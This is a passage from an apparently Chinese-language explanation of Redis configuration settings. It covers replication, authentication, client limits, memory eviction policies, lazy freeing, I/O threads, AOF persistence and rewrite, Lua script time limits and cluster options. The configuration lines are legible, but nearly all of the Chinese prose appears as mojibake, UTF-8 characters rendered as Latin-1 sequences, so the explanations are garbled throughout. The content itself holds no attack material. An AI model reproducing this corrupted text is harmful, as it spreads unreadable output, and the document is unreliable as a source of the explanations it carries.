é¡»æç»­æå¡å®¢æ·è¯·æ±ï¼ç¶åå åå­æ°æ®ç»æè¿è¡ä¸é´æ­çä¿®æ¹ã\n\nè¿ä¸ªæ¶åå°±ä¼ä½¿ç¨æä½ç³»ç»ç cow (copy on write) æºå¶æ¥è¿è¡æ°æ®æ®µé¡µé¢çåç¦»ãæ°æ®æ®µæ¯ç±å¾å¤æä½ç³»ç»çé¡µé¢ç»åèæï¼å½ç¶è¿ç¨å¯¹å¶ä¸­ä¸ä¸ªé¡µé¢çæ°æ®è¿è¡ä¿®æ¹æ¶ï¼ä¼å°è¢«å±äº«çé¡µé¢å¤å¶ä¸ä»½åç¦»åºæ¥ï¼ç¶åå¯¹è¿ä¸ªå¤å¶çé¡µé¢è¿è¡ä¿®æ¹ãè¿æ¶å­è¿ç¨ç¸åºçé¡µé¢æ¯æ²¡æååçï¼è¿æ¯è¿ç¨äº§çé£ä¸ç¬é´çæ°æ®ã\n\néçç¶è¿ç¨ä¿®æ¹æä½çæç»­è¿è¡ï¼è¶æ¥è¶å¤çå±äº«é¡µé¢è¢«åç¦»åºæ¥ï¼åå­å°±ä¼æç»­å¢é¿ï¼ä½æ¯ä¹ä¸ä¼è¶è¿åææ°æ®åå­ç 2 åå¤§å°ãå¦å¤ï¼redis å®ä¾éå·æ°æ®å çæ¯ä¾å¾å¾æ¯æ¯è¾é«çï¼æä»¥å¾å°ä¼åºç°ææçé¡µé¢é½è¢«åç¦»çæåµï¼è¢«åç¦»çå¾å¾åªæå¶ä¸­ä¸é¨åé¡µé¢ãæ¯ä¸ªé¡µé¢çå¤§å°åªæ 4kbï¼ä¸ä¸ª redis å®ä¾éé¢ä¸è¬é½ä¼ææåä¸ä¸ä¸ªé¡µé¢ã\n\nå­è¿ç¨å ä¸ºæ°æ®æ²¡æååï¼å®è½çå°åå­éçæ°æ®å¨è¿ç¨äº§ççä¸ç¬é´å°±ååºäºï¼åä¹ä¸ä¼æ¹åï¼è¿ä¹æ¶ä¸ºä»ä¹ redis çæä¹åå« å¿«ç§ çåå ãæ¥ä¸æ¥å­è¿ç¨å°±å¯ä»¥éå¸¸å®å¿å°ä¾¿å©æ°æ®ï¼è¿è¡åºååç£çäºã\n\n\n# replication ä¸»ä»å¤å¶\n\n\n# replica-serve-stale-data\n\nreplica-serve-stale-data yes\n\n\n1\n\n\nå½ä¸ä¸ª slave ä¸ master å¤±å»èç³»æ¶ï¼æèå¤å¶æ­£å¨è¿è¡çæ¶åï¼slave åºå¯¹è¯·æ±çè¡ä¸º:\n\n * å¦æä¸º yesï¼é»è®¤å¼ï¼ï¼slave ä»ç¶ä¼åºç­å®¢æ·ç«¯è¯·æ±ï¼ä½è¿åçæ°æ®å¯è½æ¯è¿æ¶ï¼æèæ°æ®å¯è½æ¯ç©ºçå¨ç¬¬ä¸æ¬¡åæ­¥çæ¶å\n * å¦æä¸º no ï¼å¨ä½ æ§è¡é¤äº info å salveof ä¹å¤çå¶ä»å½ä»¤æ¶ï¼slave é½å°è¿åä¸ä¸ª "sync with master in progress" çéè¯¯ã\n\n\n# replica-read-only\n\nreplica-read-only yes\n\n\n1\n\n\nè®¾ç½® slave æ¯å¦æ¯åªè¯»çãä» 2.6 çèµ·ï¼slave é»è®¤æ¯åªè¯»ç\n\n\n# repl-diskless-sync\n\nrepl-diskless-sync no\n\n\n1\n\n\nä¸»ä»æ°æ®å¤å¶æ¯å¦ä½¿ç¨æ ç¡¬çå¤å¶åè½ã\n\n\n# repl-diskless-sync-delay\n\nrepl-diskless-sync-delay 5\n\n\n1\n\n\næ ç£ç (diskless) æ¹å¼å¨è¿è¡æ°æ®ä¼ éä¹åä¼æä¸ä¸ªæ¶é´çå»¶è¿ï¼ä»¥ä¾¿ slave ç«¯è½å¤è¿è¡å°å¾ä¼ éçç®æ éåä¸­ï¼è¿ä¸ªæ¶é´é»è®¤æ¯ 5 ç§\n\n\n# repl-diskless-load\n\nrepl-diskless-load disabled\n\n\n1\n\n\n\n# repl-disable-tcp-nodelay\n\nrepl-disable-tcp-nodelay no\n\n\n1\n\n\næ¯å¦å¯ç¨ tcp_nodelayï¼å¦æå¯ç¨åä¼ä½¿ç¨å°éç tcp ååå¸¦å®½å»è¿è¡æ°æ®ä¼ è¾å° slave ç«¯ï¼å½ç¶éåº¦ä¼æ¯è¾æ¢ï¼å¦æä¸å¯ç¨åä¼ è¾éåº¦æ¯è¾å¿«ï¼ä½æ¯ä¼å ç¨æ¯è¾å¤çå¸¦å®½ã\n\n\n# replica-priority\n\nreplica-priority 100\n\n\n1\n\n\nå½ master ä¸è½æ­£å¸¸å·¥ä½çæ¶åï¼redis sentinel ä¼ä» slaves ä¸­éåºä¸ä¸ªæ°ç masterï¼è¿ä¸ªå¼è¶å°ï¼å°±è¶ä¼è¢«ä¼åéä¸­ï¼ä½æ¯å¦ææ¯ 0 ï¼ é£æ¯æå³çè¿ä¸ª slave ä¸å¯è½è¢«éä¸­ã é»è®¤ä¼åçº§ä¸º 100ã\n\n\n# - keys tracking é®è¿½è¸ª\n\ntracking-table-max-keys 1000000\n\n\n1\n\n\n\n# security å®å¨\n\n\n# + acllog-max-len\n\nacllog-max-len 128\n\n\n1\n\n\n\n# - aclfile\n\naclfile /etc/redis/users.acl\n\n\n1\n\n\n\n# - requirepass\n\nrequirepass foobared\n\n\n1\n\n\n\n# - rename-command\n\nrename-command config ""\n\n\n1\n\n\n\n# clients å®¢æ·\n\n\n# maxclients\n\nmaxclients 10000\n\n\n1\n\n\nè®¾ç½®æå¤§è¿æ¥å®¢æ·ç«¯æ°ãé»è®¤æåµä¸ï¼æ­¤éå¶è®¾ç½®ä¸º 10000 ä¸ªå®¢æ·ç«¯ï¼ä½æ¯ï¼å¦æ redis æå¡å¨æ æ³å°è¿ç¨æä»¶éå¶éç½®ä¸ºåè®¸æå®çéå¶ï¼ååè®¸çæå¤§å®¢æ·ç«¯æ°å°è®¾ç½®ä¸ºå½åæä»¶éå¶åå» 32ï¼å ä¸º redis ä¿çäºåé¨ä½¿ç¨çæä»¶æè¿°ç¬¦å¾å°ï¼\n\nè¾¾å°éå¶åï¼redis å°å³é­æææ°è¿æ¥ï¼å¹¶åééè¯¯æ¶æ¯ âå·²è¾¾å°æå¤§å®¢æ·ç«¯æ°ã\n\nå½ä½¿ç¨ redis cluster æ¶ï¼æå¤§è¿æ¥æ°ä¹ä¼ä¸éç¾¤æ»çº¿å±äº«ï¼éç¾¤ä¸­çæ¯ä¸ªèç¹å°ä½¿ç¨ä¸¤ä¸ªè¿æ¥ï¼ä¸ä¸ªè¿å¥ï¼å¦ä¸ä¸ªåå¤ãå¯¹äºéå¸¸å¤§çéç¾¤ï¼éè¦çæ¯ç¸åºå°è°æ´éå¶å¤§å°ã\n\n\n# memory management åå­ç®¡ç\n\n\n# maxmemory\n\nmaxmemory <bytes>\n\n\n1\n\n\nå°åå­ä½¿ç¨éå¶è®¾ç½®ä¸ºæå®çå­èæ°ãå½è¾¾å°åå­éå¶æ¶ï¼redis å°å°è¯æ ¹æ®æéçç­ç¥æ¥å é¤ keyï¼è¯·åè§ maxmemory-policyï¼ã\n\nå¦æ redis æ æ³æ ¹æ®è¯¥ç­ç¥å é¤ keyï¼æèå¦æè¯¥ç­ç¥è®¾ç½®ä¸º \'noeviction\'ï¼å redis å°å¼å§å¯¹å°ä½¿ç¨æ´å¤åå­çå½ä»¤ï¼ä¾å¦ setï¼lpush ç­ï¼è¿è¡éè¯¯ç­å¤ï¼å¹¶å°ç»§ç»­ç­å¤è¯¸å¦ get ä¹ç±»çåªè¯»å½ä»¤ã(ä¸æ¯æåï¼åªæ¯æè¯»)\n\nå¦ææ¯ä¸»ä»å¤å¶ï¼å»ºè®®æ¨ä¸º maxmemory è®¾ç½®ä¸ä¸ªä¸éï¼ä»¥ä¾¿ç³»ç»ä¸æä¸äºå¯ç¨åå­ç¨äº âä»â è¾åºç¼å²åºï¼ä½æ¯å¦æç­ç¥ä¸º \'noeviction\'ï¼åä¸éè¦è¿æ ·åï¼ã\n\n\n# maxmemory-policy\n\nmaxmemory-policy noeviction\n\n\n1\n\n\nmaxmemory ç­ç¥ï¼è¾¾å° maxmemory æ¶ï¼redis å°å¦ä½éæ©è¦å é¤çåå®¹ãæ¨å¯ä»¥ä»ä»¥ä¸è¡ä¸ºä¸­éæ©ä¸ç§ï¼\n\n * volatile-lruï¼å©ç¨ lru ç®æ³ç§»é¤è¿æ keysã\n * allkeys-lruï¼å©ç¨ lru ç®æ³ç§»é¤ keysã\n * volatile-randomï¼éæºç§»é¤è¿æ keysã\n * allkeys-randomï¼éæºç§»é¤ keysã\n * volatile-ttlï¼æç§æè¿è¿ææ¶é´æ¥å é¤ï¼è¾ä»¥ ttlï¼ï¼ç§»é¤å³å°è¿æç keysã\n * noevictionï¼ä¸ç§»é¤ä»»ä½ keyï¼åªæ¯è¿åä¸ä¸ªåéè¯¯ã\n\n\n# maxmemory-samples\n\nmaxmemory-samples 5\n\n\n1\n\n\nredis ä¸­ç lru ä¸æ¯ä¸¥æ ¼æä¹ä¸ç lru ç®æ³å®ç°ï¼æ¯ä¸ç§è¿ä¼¼ç lru å®ç°ï¼ä¸»è¦æ¯ä¸ºäºèçº¦åå­å ç¨ä»¥åæåæ§è½ã\n\nredis ç lru æ¯ååº éç½®çæ°ç®ç key (5)ï¼ç¶åä»ä¸­éæ©ä¸ä¸ªæè¿æä¸ç»å¸¸ä½¿ç¨ç key è¿è¡ç½®æ¢ã\n\nå¯¹ lru æ¥è¯´ 5 æ¯æ¯è¾åéçã10 å·²ç»å¾æ¥è¿äºçæ­£ç lruï¼ä½ä¼æ¶èæ´å¤ç cpuã3 ä¼æ´å¿«ä½æ²¡æé£ä¹ç²¾ç¡®ã\n\n\n# replica-ignore-maxmemory\n\nreplica-ignore-maxmemory yes\n\n\n1\n\n\nä» redis 5 å¼å§ï¼é»è®¤æåµä¸ï¼replica èç¹ä¼å¿½ç¥ maxmemory è®¾ç½®ï¼é¤éå¨åç failover åï¼æ­¤èç¹è¢«æåä¸º master èç¹ï¼ã è¿æå³çåªæ master æä¼æ§è¡è¿æå é¤ç­ç¥ï¼å¹¶ä¸ master å¨å é¤é®ä¹åä¼å¯¹ replica åé del å½ä»¤ã\n\nè¿ä¸ªè¡ä¸ºä¿è¯äº master å replicas çä¸è´æ§ï¼å¹¶ä¸è¿éå¸¸ä¹æ¯ä½ éè¦çï¼ä½æ¯è¥ä½ ç replica èç¹æ¯å¯åçï¼ æèä½ å¸æ replica èç¹æä¸åçåå­éç½®ï¼å¹¶ä¸ä½ ç¡®ä¿ææå° replica åæä½é½å¹ç­çï¼é£ä¹ä½ å¯ä»¥ä¿®æ¹è¿ä¸ªé»è®¤çè¡ä¸º ï¼è¯·ç¡®ä¿ä½ æç½ä½ å¨åä»ä¹ï¼ã\n\néè¦æ³¨æçæ¯é»è®¤æåµä¸ replica èç¹ä¸ä¼æ§è¡è¿æç­ç¥ï¼å®æå¯è½ä½¿ç¨äºè¶è¿ maxmemory è®¾å®çå¼çåå­ã å æ­¤ä½ éè¦çæ§ replicas èç¹æå¨çæºå¨å¹¶ä¸ç¡®ä¿å¨ master èç¹å°è¾¾éç½®ç maxmemory å¤§å°æ¶ï¼ replicas èç¹ä¸ä¼è¶è¿ç©çåå­çå¤§å°ã\n\n\n# active-expire-effort\n\nactive-expire-effort 1\n\n\n1\n\n\n\n# lazy freeing ææ°éæ¾\n\nlazy free åºç¨äºè¢«å¨å é¤ä¸­ï¼ç®åæ 4 ç§åºæ¯ï¼æ¯ç§åºæ¯å¯¹åºä¸ä¸ªéç½®åæ°ï¼ é»è®¤é½æ¯å³é­ã\n\nlazyfree-lazy-eviction no\nlazyfree-lazy-expire no\nlazyfree-lazy-server-del no\nreplica-lazy-flush no\n\n\n1\n2\n3\n4\n\n\n\n# lazyfree-lazy-eviction\n\néå¯¹ redis åå­ä½¿ç¨è¾¾å° maxmeoryï¼å¹¶è®¾ç½®ææ·æ±°ç­ç¥æ¶ï¼å¨è¢«å¨æ·æ±°é®æ¶ï¼æ¯å¦éç¨ lazy free æºå¶ï¼\n\nå ä¸ºæ­¤åºæ¯å¼å¯ lazy free, å¯è½ä½¿ç¨æ·æ±°é®çåå­éæ¾ä¸åæ¶ï¼å¯¼è´ redis åå­è¶ç¨ï¼è¶è¿ maxmemory çéå¶ãæ­¤åºæ¯ä½¿ç¨æ¶ï¼è¯·ç»åä¸å¡æµè¯ã\n\n\n# lazyfree-lazy-expire\n\néå¯¹è®¾ç½®æ ttl çé®ï¼è¾¾å°è¿æåï¼è¢« redis æ¸çå é¤æ¶æ¯å¦éç¨ lazy free æºå¶ï¼\n\næ­¤åºæ¯å»ºè®®å¼å¯ï¼å  ttl æ¬èº«æ¯èªéåºè°æ´çéåº¦ã\n\n\n# lazyfree-lazy-server-del\n\néå¯¹æäºæä»¤å¨å¤çå·²å­å¨çé®æ¶ï¼ä¼å¸¦æä¸ä¸ªéå¼ç del é®çæä½ãrename å½ä»¤å½ç®æ é®å·²å­å¨ï¼redis ä¼åå é¤ç®æ é®ï¼å¦æè¿äºç®æ é®æ¯ä¸ä¸ª big key, é£å°±ä¼å¼å¥é»å¡å é¤çæ§è½é®é¢ã æ­¤åæ°è®¾ç½®å°±æ¯è§£å³è¿ç±»é®é¢ï¼å»ºè®®å¯å¼å¯ã\n\n\n# slave-lazy-flush\n\néå¯¹ slave è¿è¡å¨éæ°æ®åæ­¥ï¼slave å¨å è½½ master ç rdb æä»¶åï¼ä¼è¿è¡ flushall æ¥æ¸çèªå·±çæ°æ®åºæ¯ï¼åæ°è®¾ç½®å³å®æ¯å¦éç¨å¼å¸¸ flush æºå¶ãå¦æåå­åå¨ä¸å¤§ï¼å»ºè®®å¯å¼å¯ãå¯åå°å¨éåæ­¥èæ¶ï¼ä»èåå°ä¸»åºå è¾åºç¼å²åºçæ¶¨å¼èµ·çåå­ä½¿ç¨å¢é¿ã\n\n\n# lazyfree-lazy-user-del\n\nå¯¹äºä¸å®¹æç¨ unlink è°ç¨æ¿æ¢ç¨æ·ä»£ç  del è°ç¨çæåµï¼ä¹å¯ä»¥ä½¿ç¨ lazyfree-lazy-user-del yes éç½®æä»¤å° del å½ä»¤çé»è®¤è¡ä¸ºä¿®æ¹ä¸ºä¸ unlink å®å¨ç¸åã\n\n\n# threaded i/o çº¿ç¨\n\né»è®¤æåµä¸ï¼çº¿ç¨æ¯ç¦ç¨çï¼æä»¬å»ºè®®ä»å¨å·æè³å° 4 ä¸ªææ´å¤åæ ¸çè®¡ç®æºä¸å¯ç¨å®ï¼èè³å°ä¿çä¸ä¸ªå¤ç¨åæ ¸ãä½¿ç¨ 8 ä¸ªä»¥ä¸ççº¿ç¨ä¸å¤ªå¯è½æå¾å¤§å¸®å©ãæä»¬è¿å»ºè®®å¨ç¡®å®å­å¨æ§è½é®é¢æ¶åä½¿ç¨çº¿ç¨ i / oï¼redis å®ä¾ä¼ä½¿ç¨å¾å¤§ä¸é¨å cpu æ¶é´ï¼å¦åå°±æ²¡æå¿è¦ä½¿ç¨æ­¤åè½ã\n\nio-threads 4\n\n\n1\n\n\nå æ­¤ï¼å¦ææ¨æåä¸ªæ ¸çï¼è¯·å°è¯ä½¿ç¨ 2 æ 3 ä¸ª i / o çº¿ç¨ï¼å¦ææ¨æ 8 ä¸ªæ ¸ï¼è¯·å°è¯ä½¿ç¨ 6 ä¸ªçº¿ç¨ã\n\n\n# io-threads-do-reads\n\nio-threads-do-reads no\n\n\n1\n\n\néå¸¸ï¼å° io-threads è®¾ç½®ä¸º 1 åªä¼ä½¿ç¨ä¸»çº¿ç¨ãå¯ç¨ i / o çº¿ç¨åï¼æä»¬ä»å°çº¿ç¨ç¨äºåæä½ï¼å³å¯¹ write ç³»ç»è°ç¨è¿è¡çº¿ç¨åï¼å¹¶å°å®¢æ·ç«¯ç¼å²åºä¼ è¾å°å¥æ¥å­ãä½æ¯ï¼ä¹å¯ä»¥éè¿ io-threads-do-reads yes æ¥å¯ç¨è¯»åçº¿ç¨ååè®®è§£æãéå¸¸ï¼çº¿ç¨è¯»åæ²¡æå¤ªå¤§å¸®å©ã\n\næ æ³å¨è¿è¡æ¶éè¿ config set æ´æ¹æ­¤éç½®æä»¤ãå¯ç¨ s sl æ¶ï¼aso æ­¤åè½å½åä¸èµ·ä½ç¨ã\n\n\n# kernel oom control åæ ¸ oom æ§å¶\n\nè¿ä¸ª oom-score-adj åæ°æ¯ç¨æ¥ linux åæ ¸æ§å¶è°ä¼çï¼å¨ linux ç³»ç»ä¸­ï¼å½åå­æº¢åºæ¶ï¼å¯ä»¥æç¤ºåæ ¸ oom killer åºè¯¥é¦åææ­»åªäºè¿ç¨ã\n\noom-score-adj no\n\n\n1\n\n\nå¯ç¨æ­¤åè½å¯ä½¿ redis æ ¹æ®å¶è¿ç¨ä¸»å¨æ§å¶å¶ææè¿ç¨ç oom_score_adj å¼ãé»è®¤åæ°å°å°è¯ä½¿åå°å­è¿ç¨å¨ææå¶ä»è¿ç¨ä¹åè¢«ææ­»ï¼è replicas å¨ä¸»æ°æ®åºä¹åè¢«ææ­»ã\n\noom-score-adj-values 0 200 800\n\n\n1\n\n\né»è®¤ oom-score-adj-values ä¸è®¾ç½®çæåµä¸ä¼ä¼åææ­»åå°å­è¿ç¨ï¼ç¶åä¸»ä»èç¹ä¼åä¼åææ­»ä»èç¹ã\n\næä»¥è¿ 3 ä¸ªå¼åå«ç¨æ¥è®¾ç½®ä¸»ãä»ãåå°å­è¿ç¨çåå¼çï¼åå¼èå´ä» -1000 ~ 1000ï¼åå¼è¶é«è¶æå¯è½è¢«åææ­»ã\n\n\n# append only mode aof è¿½å æ¨¡å¼\n\nredis å¯ä»¥å®ç°æ°æ®çæä¹åå­å¨ï¼å³å°æ°æ®ä¿å­å°ç£çä¸ã\nredis çæä¹åå­å¨æä¾ä¸¤ç§æ¹å¼ï¼rdb ä¸ aofãrdb æ¯é»è®¤éç½®ãaof éè¦æå¨å¼å¯ã\nç°å¨ redis çéç½®ä¸­é»è®¤æ¯å³é­ aof æ¨¡å¼çã\n\n\n# appendonly\n\nappendonly no\n\n\n1\n\n\næ¯å¦å¼å¯ aof\n\n\n# appendfilename\n\nappendfilename "appendonly.aof"\n\n\n1\n\n\nä¿å­æ°æ®ç aof æä»¶åç§°\n\n\n# appendfsync\n\n# appendfsync always\nappendfsync everysec\n# appendfsync no\n\n\n1\n2\n3\n\n\nredis æ¯æ 3 ç§ä¸åçæ¨¡å¼ï¼\n\n * noï¼ä¸å³æ¶åæ­¥ï¼ç±æä½ç³»ç»æ§å¶ä½æ¶å·åå°ç£çä¸ï¼è¿ç§æ¨¡å¼éåº¦æå¿«ï¼\n * alwaysï¼æ¯æ¬¡åªåæ¥å¿ï¼éåº¦è¾æ¢ï¼ä½æå®å¨ï¼\n * everysecï¼æ¯ç§éåæ­¥ä¸æ¬¡ï¼æä¸­çæ¹æ¡ã\n\n\n# no-appendfsync-on-rewrite\n\nno-appendfsync-on-rewrite no\n\n\n1\n\n\nå½ä½¿ç¨ aof ç appendfsync è®¾ç½®ä¸º always æ everysec æ¶ï¼åå°çå­å¨è¿ç¨ä¼æ§è¡å¤§éçç£ç i/o æä½ï¼å¨ä¸äº linux æ¶æä¸­ï¼redis fsync () è°ç¨æ¶å¯è½ä¼é»å¡å¾ä¹ãè¿ä¸ªé®é¢å½åå¹¶æ²¡æä¿®å¤ï¼å³ä½¿æ¯å¨ä¸ä¸ªä¸åççº¿ç¨æ§è¡ fsync ä¹ä¼é»å¡æä»¬çåæ­¥åè°ç¨ã\n\nä¸ºäºç¼è§£è¿ä¸ªé®é¢ï¼å¯ä»¥ä½¿ç¨ä»¥ä¸éé¡¹ï¼å®å°ä¼å¨æä¸ä¸ª bgsave æ bgrewriteaof æ­£å¨è¿è¡æ¶ï¼é»æ­¢ä¸»è¿ç¨è°ç¨ fsync ()ã\n\nè¿æå³çæå¦ä¸ä¸ªå­è¿ç¨å¨å­å¨æ¶ï¼redis çæä¹æ§ç­åäº appendfsync noãå¨å®è·µä¸­ï¼æå³çå¨æåçæåµä¸å®å¯è½ä¸¢å¤±å¤è¾¾ 30 ç§çæ¥å¿ï¼é»è®¤ç linux è®¾ç½®ï¼ã\n\nå¦æä½ ææ½å¨çé®é¢éè¦æ´æ¹å®ä¸º âyesâãå¦åä»æä¹æ§çè§ç¹æ¥ç ânoâ æ¯æå®å¨çéæ©ã\n\n\n# auto-aof-rewrite-percentage auto-aof-rewrite-min-size\n\nauto-aof-rewrite-percentage 100\n\n\n1\n\n\naof æä»¶å¢é¿æ¯ä¾ï¼æå½å aof æä»¶æ¯ä¸æ¬¡éåçå¢é¿æ¯ä¾å¤§å°ãaof éåå³å¨ aof æä»¶å¨ä¸å®å¤§å°ä¹åï¼éæ°å°æ´ä¸ªåå­åå° aof æä»¶å½ä¸­ï¼ä»¥åæ ææ°çç¶æ (ç¸å½äº bgsave)ãè¿æ ·å°±é¿åäºï¼aof æä»¶è¿å¤§èå®éåå­æ°æ®å°çé®é¢ (é¢ç¹ä¿®æ¹æ°æ®é®é¢).\n\n\n# auto-aof-rewrite-min-size\n\nauto-aof-rewrite-min-size 64mb\n\n\n1\n\n\naof æä»¶éåæå°çæä»¶å¤§å°ï¼å³æå¼å§ aof æä»¶å¿é¡»è¦è¾¾å°è¿ä¸ªæä»¶æ¶æè§¦åï¼åé¢çæ¯æ¬¡éåå°±ä¸ä¼æ ¹æ®è¿ä¸ªåéäº (æ ¹æ®ä¸ä¸æ¬¡éåå®æä¹åçå¤§å°). æ­¤åéä»åå§åå¯å¨ redis ææãå¦ææ¯ redis æ¢å¤æ¶ï¼å lastsize ç­äºåå§ aof æä»¶å¤§å°ã\n\n# rewrite æºå¶\n\nå¶å® redis oaf æºå¶åæ¬äºä¸¤ä»¶äºï¼rewrite å aofãrewrite ç±»ä¼¼äºæ®éæ°æ®åºç®¡çç³»ç»æ¥å¿æ¢å¤ç¹ï¼å½ aof æä»¶éçåå½ä»¤çè¿è¡è¨èæ¶ï¼å½æä»¶å¤§å°è§¦ç¢°å°ä¸´çæ¶ï¼rewrite ä¼è¢«è¿è¡ã\n\nrewrite ä¼åå¤å¶ä¸æ ·ï¼fork åºä¸ä¸ªå­è¿ç¨ï¼åå»ºä¸ä¸ªä¸´æ¶æä»¶ï¼éåæ°æ®åºï¼å°æ¯ä¸ª keyãvalue å¯¹è¾åºå°ä¸´æ¶æä»¶ãè¾åºæ ¼å¼å°±æ¯ redis çå½ä»¤ï¼ä½æ¯ä¸ºäºåå°æä»¶å¤§å°ï¼ä¼å°å¤ä¸ª keyãvalue å¯¹éåæ´çç¨ä¸æ¡å½ä»¤è¡¨è¾¾ãå¨ rewrite æé´çåæä½ä¼ä¿å­å¨åå­ç rewrite buffer ä¸­ï¼rewrite æååè¿äºæä½ä¹ä¼å¤å¶å°ä¸´æ¶æä»¶ä¸­ï¼å¨æåä¸´æ¶æä»¶ä¼ä»£æ¿ aof æä»¶ã\n\nç®åæ¥è¯´ï¼aof éå­æ¾äºææç redis æä½æä»¤ï¼å½ aof æä»¶è¾¾å°ä¸å®æ¡ä»¶æèæå¨ bgrewriteaof å½ä»¤é½å¯ä»¥è§¦å rewriteãrewrite ä¹å aof æä»¶ä¼ä¿å­ keys çæåçç¶æï¼æ¸é¤æä¹ååä½çï¼æ¥ç¼©å°è¿ä¸ªæä»¶ãè¿éæè°çç¼©å°å°±æ¯ æ´çæä»¤ ï¼æ¯å¦å®¢æ·ç«¯åéè¿ä¸ä¸ªå½ä»¤ï¼\n\nlpush key 1 2 3\n# ç§»åºå·¦è¾¹ç¬¬ä¸ä¸ªåç´ ï¼ä¹å°±æ¯æä¸é¢çåç´  1 ç§»åº\nlpop key \nlpush key 4 5 6\n\n\n1\n2\n3\n4\n\n\næ´çåçæä»¤æä»¶æ¯\n\nlpush key 4 5 6 2 3\n\n\n1\n\n\n\n# aof-load-truncated\n\naof-load-truncated yes\n\n\n1\n\n\næ redis å¨æ¢å¤æ¶ï¼ä¼å¿½ç¥æåä¸æ¡å¯è½å­å¨é®é¢çæä»¤ãé»è®¤å¼ yesãå³å¨ aof åå¥æ¶ï¼å¯è½å­å¨æä»¤åéçé®é¢ (çªç¶æ­çµï¼åäºä¸å)ï¼è¿ç§æåµä¸ï¼yes ä¼ log å¹¶ç»§ç»­ï¼è no ä¼ç´æ¥æ¢å¤å¤±è´¥.\n\n\n# aof-use-rdb-preamble\n\naof-use-rdb-preamble yes\n\n\n1\n\n\næ··åæä¹ååæ ·ä¹æ¯éè¿ bgrewriteaof å®æçï¼ä¸åçæ¯å½å¼å¯æ··åæä¹åæ¶ï¼fork åºçå­è¿ç¨åå°å±äº«çåå­å¯æ¬å¨éçä»¥ rdb æ¹å¼åå¥ aof æä»¶ï¼ç¶åå¨å°éåç¼å²åºçå¢éå½ä»¤ä»¥ aof æ¹å¼åå¥å°æä»¶ï¼åå¥å®æåéç¥ä¸»è¿ç¨æ´æ°ç»è®¡ä¿¡æ¯ï¼å¹¶å°æ°çå«æ rdb æ ¼å¼å aof æ ¼å¼ç aof æä»¶æ¿æ¢æ§çç aof æä»¶ãç®åçè¯´ï¼æ°ç aof æä»¶ååæ®µæ¯ rdb æ ¼å¼çå¨éæ°æ®ååæ®µæ¯ aof æ ¼å¼çå¢éæ°æ®ã\n\n\n# lua scripting lua èæ¬\n\nredis æä¾äº lua èæ¬åè½æ¥è®©ç¨æ·å®ç°èªå·±çåå­å½ä»¤ï¼ä½ä¹å­å¨çé£é©ï¼ç¼åä¸å½çèæ¬å¯è½é»å¡çº¿ç¨å¯¼è´æ´ä¸ª redis æå¡ä¸å¯ç¨ã\n\nlua-time-limit 5000\n\n\n1\n\n\nredis çéç½®æä»¶ä¸­æä¾äºå¦ä¸éç½®é¡¹æ¥è§å®æå¤§æ§è¡æ¶é¿ã\n\nä½è¿éæä¸ªåï¼å½ä¸ä¸ªèæ¬è¾¾å°æå¤§æ§è¡æ¶é¿çæ¶åï¼redis å¹¶ä¸ä¼å¼ºå¶åæ­¢èæ¬çè¿è¡ï¼ä»ä»å¨æ¥å¿éæå°ä¸ªè­¦åï¼åç¥æèæ¬è¶æ¶ã\n\nå ä¸º redis å¿é¡»ä¿è¯èæ¬æ§è¡çåå­æ§ï¼ä¸­éåæ­¢å¯è½å¯¼è´åå­çæ°æ®éä¸åªä¿®æ¹äºé¨åæ°æ®ã\n\nå¦ææ¶é¿è¾¾å° lua-time-limit è§å®çæå¤§æ§è¡æ¶é´ï¼redis åªä¼åè¿å ä»¶äºæï¼\n\n * æ¥å¿è®°å½æèæ¬è¿è¡è¶æ¶\n * å¼å§åè®¸æ¥åå¶ä»å®¢æ·ç«¯è¯·æ±ï¼ä½ä»éäº script kill å shutdown nosave ä¸¤ä¸ªå½ä»¤\n * å¶ä»è¯·æ±ä»è¿å busy éè¯¯\n\n\n# - cluster éç¾¤\n\ncluster-enabled yes\n\n\n1\n\n\nå¼å¯éç¾¤æ¨¡å¼\n\ncluster-config-file nodes-6379.conf\n\n\n1\n\n\n1ãè¿ä¸ªéç½®æä»¶ä¸æ¯è¦æä»¬å»éçï¼èæ¯ redis è¿è¡æ¶ä¿å­éç½®çæä»¶ï¼æä»¥æä»¬ä¹ä¸å¯ä»¥ä¿®æ¹è¿ä¸ªæä»¶ã\n\n2ãredis éç¾¤èç¹æ¯æ¬¡åçæ´æ¹æ¶èªå¨ä¿çéç¾¤éç½®ï¼åºæ¬ä¸ä¸ºç¶æï¼çæä»¶ï¼ä»¥ä¾¿è½å¤ å¨å¯å¨æ¶éæ°è¯»åå®ã\n\n3ãè¯¥æä»¶ååºäºéç¾¤ä¸­å¶ä»èç¹ï¼å®ä»¬çç¶æï¼æä¹åéç­ç­ä¿¡æ¯ã ç±äºæäºæ¶æ¯çæ¥æ¶ï¼éå¸¸ä¼å°æ­¤æä»¶éåå¹¶å·æ°å°ç£çä¸ã\n\n4ãçæçæä»¶å¨ dir æå®è·¯å¾ä¸\n\ncluster-node-timeout 15000\n\n\n1\n\n\nè¶æ¶æ¶é´æ¯éç¾¤ä¸­åèç¹ç¸äºéè®¯æ¶ï¼åè®¸ "å¤±è" çæå¤§æ¯«ç§æ°ï¼ä¸é¢çéç½®ä¸º 15 ç§ï¼å¦æè¶è¿ 15 ç§æä¸ªèç¹æ²¡åå¶å®èç¹æ±æ¥æåï¼è®¤ä¸ºè¯¥èç¹æäºã\n\ncluster-replica-validity-factor 10\n\n\n1\n\n\n1ãå¦æè®¾ç½®ä¸º 0ï¼æ è®ºä¸»èç¹åä»èç¹ä¹é´çé¾è·¯æ­å¼è¿æ¥çæ¶é´é¿ç­ï¼ä»èç¹é½å°å°è¯æéåæ¢ä¸ºä¸»èç¹ã\n\n2ã å¦æè¯¥å¼ä¸ºæ­£å¼ï¼åè®¡ç®æå¤§æ­å¼æ¶é´ä½ä¸ºèç¹è¶æ¶å¼ä¹ä»¥æ­¤éé¡¹æä¾çç³»æ°ï¼å¦æè¯¥èç¹æ¯ä»èç¹ï¼åå¨ä¸»é¾è·¯æ­å¼è¿æ¥çæ¶é´è¶è¿æå®çè¶æ¶å¼æ¶ï¼å®ä¸ä¼å°è¯å¯å¨æéåæ¢ã ä¾å¦ï¼å¦æèç¹è¶æ¶è®¾ç½®ä¸º 5 ç§ï¼å¹¶ä¸ææå å­è®¾ç½®ä¸º 10ï¼åä¸ä¸»èç¹æ­å¼è¿æ¥è¶è¿ 50 ç§çä»èç¹å°ä¸ä¼å°è¯å¯¹å¶ä¸»èç¹è¿è¡æéåæ¢ã\n\n3ãè¯·æ³¨æï¼å¦ææ²¡æä»æå¡å¨èç¹è½å¤å¯¹å¶è¿è¡æ